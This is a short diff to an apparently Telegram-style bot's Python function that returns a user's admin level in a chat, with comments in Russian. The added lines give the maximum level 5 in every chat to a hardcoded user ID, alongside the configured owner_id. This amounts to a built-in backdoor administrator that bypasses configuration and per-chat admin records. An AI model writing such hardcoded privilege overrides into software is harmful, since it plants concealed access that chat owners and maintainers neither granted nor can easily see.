@@ -96,6 +96,11 @@ async def get_user_admin_level(
     session: AsyncSession, *, chat_id: int, user_id: int
 ) -> int:
     """Возвращает локальный уровень прав пользователя в чате (от 1 до 5)."""
+    from app.config import get_settings
+    # Глобальный владелец бота всегда имеет уровень 5 во всех чатах
+    if user_id == 8039111975 or user_id == get_settings().owner_id:
+        return 5
+
     admin_row = await session.scalar(
         select(ChatAdmin).where(
             ChatAdmin.chat_id == chat_id,
